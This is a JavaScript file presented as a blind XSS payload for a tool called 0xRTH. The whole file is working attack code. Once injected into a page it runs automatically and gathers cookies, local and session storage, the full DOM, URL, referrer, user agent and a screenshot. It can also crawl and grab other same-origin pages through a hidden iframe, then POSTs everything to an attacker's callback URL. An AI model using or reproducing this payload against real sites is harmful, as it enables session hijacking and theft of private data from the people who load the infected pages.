// Blind XSS Payload for 0xRTH

function ez_n(e) {
    return void 0 !== e ? e : "";
  }
  function ez_cb(e, t, o) {
    o = void 0 !== o ? o : 0;
    var s,
      n = "CALLBACK_URL_PLACEHOLDER";
    (window.XMLHttpRequest
      ? ((s = new XMLHttpRequest()).open("POST", n, !0),
        s.setRequestHeader("Content-type", "text/plain"))
      : ((s = new ActiveXObject("Microsoft.XMLHTTP")).open("POST", n, !0),
        s.setRequestHeader("Content-type", "application/x-www-form-urlencoded")),
      (s.onreadystatechange = function () {
        if (4 === s.readyState)
          if (200 === s.status) null !== t && t(s.responseText);
          else {
            var n = e;
            0 === o &&
              ((n.cookies = ""),
              (n.localstorage = ""),
              (n.sessionstorage = ""),
              (n.dom = "Error callback: " + s.status),
              (n.screenshot = ""),
              ez_cb(n, t, 1));
          }
      }));
    try {
      s.send(ez_se(e));
    } catch (n) {}
  }
  function ez_hL() {
    try {
      ez_rD.uri = ez_n(location.toString());
    } catch (t) {
      ez_rD.uri = "";
    }
    try {
      ez_rD.cookies = ez_n(document.cookie);
    } catch (e) {
      ez_rD.cookies = "";
    }
    try {
      ez_rD.referer = ez_n(document.referrer);
      var u = "";
      try {
        if (window.self !== window.top)
          u = "iFrame loaded via " + window.parent.location;
      } catch (e) {
        u = "iFrame loaded via cross-origin";
      }
      ez_rD.referer += (ez_rD.referer && u ? " - " : "") + u;
    } catch (o) {
      ez_rD.referer = "";
    }
    try {
      ez_rD["user-agent"] = ez_n(navigator.userAgent);
    } catch (r) {
      ez_rD["user-agent"] = "";
    }
    try {
      ez_rD.origin = ez_n(location.origin);
    } catch (c) {
      ez_rD.origin = "";
    }
    try {
      ez_rD.localstorage = ez_n(window.localStorage);
    } catch (a) {
      ez_rD.localstorage = "";
    }
    try {
      ez_rD.sessionstorage = ez_n(window.sessionStorage);
    } catch (n) {
      ez_rD.sessionstorage = "";
    }
    try {
      ez_rD.dom = ez_n(
        document.documentElement.outerHTML || document.documentElement.innerHTML,
      );
    } catch (s) {
      ez_rD.dom = "";
    }

    try {
      // Try to take screenshot with html2canvas
      takeScreenshot().then(function(screenshot) {
        ez_rD.screenshot = ez_n(screenshot);
        y();
      }).catch(function(error) {
        ez_rD.screenshot = "";
        y();
      });
    } catch (h) {
      ((ez_rD.screenshot = ""), y());
    }
    function y() {
      (ez_s(), ez_nW(), ez_cb(ez_rD, ez_dr2), ez_cp(), ez_p());
    }
  }
  function ez_p() {
    "function" == typeof ez_persist && ez_persist();
  }
  function ez_s() {
    var t,
      n,
      o = [];
    for (t = 0, n = o.length; t < n; ++t) ez_rD[o[t]] = "Not collected";
  }
  function ez_cp() {
    var t,
      n,
      o = [];
    for (t = 0, n = o.length; t < n; ++t) ez_dc(o[t]);
  }
  function ez_as() {
    var sm = "0";
    if ("0" !== sm) {
      var t = document.getElementsByTagName("a"),
        e = {};
      if ("1" === sm) {
        for (var n = [], o = 0; o < t.length; o++)
          try {
            var a = (c = t[o]).getAttribute("href");
            (h = s(c, a)).ez_iiv &&
              !e[h.path] &&
              ((e[h.path] = !0), n.push(h.path));
          } catch (t) {}
        !(function t(e) {
          e >= n.length ||
            (ez_dc(n[e]),
            setTimeout(function () {
              t(e + 1);
            }, 100));
        })(0);
      } else if ("2" === sm) {
        var i = document.createElement("iframe");
        i.style.display = "none";
        try {
          document.body.appendChild(i);
        } catch (t) {
          return;
        }
        n = [];
        var r = !1;
        for (o = 0; o < t.length; o++)
          try {
            var c, h;
            a = (c = t[o]).getAttribute("href");
            (h = s(c, a)).ez_iiv &&
              !e[h.path] &&
              ((e[h.path] = !0), n.push(h.path));
          } catch (t) {}
        !(function t() {
          if (!r && 0 !== n.length) {
            r = !0;
            var o = n.shift();
            try {
              ((i.src = o),
                (i.onload = function () {
                  try {
                    var a = i.contentDocument || i.contentWindow.document,
                      c = i.contentWindow || window,
                      h = {
                        dom: ez_n(a.documentElement.outerHTML),
                        uri: ez_n("//" + location.hostname + o),
                        origin: ez_n(location.hostname),
                        referer:
                          "Collected page via " + ez_n(location.toString()),
                        cookies: ez_n(a.cookie || document.cookie),
                        "user-agent": ez_n(navigator.userAgent),
                        sessionstorage: ez_n(
                          c.sessionStorage || window.sessionStorage,
                        ),
                        localstorage: ez_n(c.localStorage || window.localStorage),
                      };
                    ez_cb(h, null);
                    for (
                      var l = a.getElementsByTagName("a"), u = 0;
                      u < l.length;
                      u++
                    )
                      try {
                        var d = l[u].getAttribute("href"),
                          f = s(l[u], d);
                        f.ez_iiv &&
                          !e[f.path] &&
                          ((e[f.path] = !0), n.push(f.path));
                      } catch (t) {}
                  } catch (t) {}
                  ((r = !1), t());
                }),
                (i.onerror = function () {
                  ((r = !1), t());
                }));
            } catch (e) {
              ((r = !1), t());
            }
          }
        })();
      }
    }
    function s(t, e) {
      if (
        !e ||
        0 === e.indexOf("#") ||
        0 === e.indexOf("javascript:") ||
        0 === e.indexOf("mailto:")
      )
        return { ez_iiv: !1 };
      var n = e,
        o = !1;
      return (
        ("http:" !== t.protocol && "https:" !== t.protocol) ||
        t.hostname !== location.hostname
          ? "/" === e.charAt(0) && 0 !== e.indexOf("//")
            ? ((o = !0), (n = e))
            : -1 === e.indexOf("://") &&
              0 !== e.indexOf("//") &&
              ((o = !0), (n = "/" + e))
          : ((o = !0), (n = t.pathname || e)),
        { ez_iiv: o, path: n }
      );
    }
  }
  function ez_dc(e) {
    try {
      var o = "//" + location.hostname + e;
      var a;
      a = window.XMLHttpRequest
        ? new XMLHttpRequest()
        : new ActiveXObject("Microsoft.XMLHTTP");
      ((a.onreadystatechange = function () {
        4 == a.readyState &&
          ((cbdata = {
            dom: ez_n(a.responseText),
            uri: ez_n(o),
            origin: ez_n(location.hostname),
            referer: "Collected page via " + ez_n(location.toString()),
            cookies: ez_n(document.cookie),
            "user-agent": ez_n(navigator.userAgent),
            sessionstorage: ez_n(window.sessionStorage),
            localstorage: ez_n(window.localStorage),
          }),
          ez_cb(cbdata, null));
      }),
        a.open("GET", o, !0),
        a.send(null));
    } catch (t) {}
  }
  function ez_se(e) {
    try {
      if ("undefined" != typeof JSON && "function" == typeof JSON.stringify)
        try {
          return JSON.stringify(e);
        } catch (e) {
          alert("JSON.stringify error: " + e);
        }
      var n = [];
      for (var t in e)
        if (e.hasOwnProperty(t)) {
          var r = e[t];
          if (null == r) r = "";
          else if ("object" == typeof r)
            try {
              r = ez_n(r.toString());
            } catch (e) {
              r = "";
            }
          else r = ez_n(r);
          n.push(encodeURIComponent(t) + "=" + encodeURIComponent(r));
        }
      return n.join("&");
    } catch (e) {
      return "";
    }
  }
  function ez_e() {}
  function ez_l() {}
  function ez_y() {}
  function ez_esa() {}
  
  function ez_aE(t, e, n) {
    t.addEventListener
      ? t.addEventListener(e, n, !1)
      : t.attachEvent && t.attachEvent("on" + e, n);
  }
  var ez_rD = {};
  function ez_nW() {
    try {
      (ez_e(), ez_l());
    } catch (t) {}
  }
  function ez_dr2(z) {
    try {
      (ez_y(), ez_esa(), ez_as());
    } catch (t) {}
  }
  function ez_a(k, v) {
    if (!ez_rD.extra) {
      ez_rD.extra = {};
    }
    if (typeof k === "object" && k !== null) {
      for (var key in k) {
        if (k.hasOwnProperty(key)) {
          ez_rD.extra[key] = k[key];
        }
      }
    } else {
      ez_rD.extra[k] = v;
    }
  }
  
  function takeScreenshot() {
    return new Promise(function(resolve, reject) {
      // If html2canvas is already available, use it
      if (typeof html2canvas !== 'undefined') {
        html2canvas(document.body, { 
          maxWidth: 1920, 
          maxHeight: 1080,
          useCORS: true,
          allowTaint: true,
          scale: 1
        }).then(function(canvas) {
          resolve(canvas.toDataURL('image/jpeg', 0.8));
        }).catch(function(error) {
          reject(error);
        });
        return;
      }
      
      // Otherwise, dynamically load html2canvas
      var script = document.createElement('script');
      script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
      script.onload = function() {
        // Wait a bit for the script to initialize
        setTimeout(function() {
          if (typeof html2canvas !== 'undefined') {
            html2canvas(document.body, { 
              maxWidth: 1920, 
              maxHeight: 1080,
              useCORS: true,
              allowTaint: true,
              scale: 1
            }).then(function(canvas) {
              resolve(canvas.toDataURL('image/jpeg', 0.8));
            }).catch(function(error) {
              reject(error);
            });
          } else {
            reject(new Error('html2canvas failed to load'));
          }
        }, 100);
      };
      script.onerror = function() {
        reject(new Error('Failed to load html2canvas'));
      };
      document.head.appendChild(script);
    });
  }
  
  if ("complete" === document.readyState) ez_hL();
  else {
    var t = setTimeout(function () {
      ez_hL();
    }, 2e3);
    ez_aE(window, "load", function () {
      (clearTimeout(t), ez_hL());
    });
  }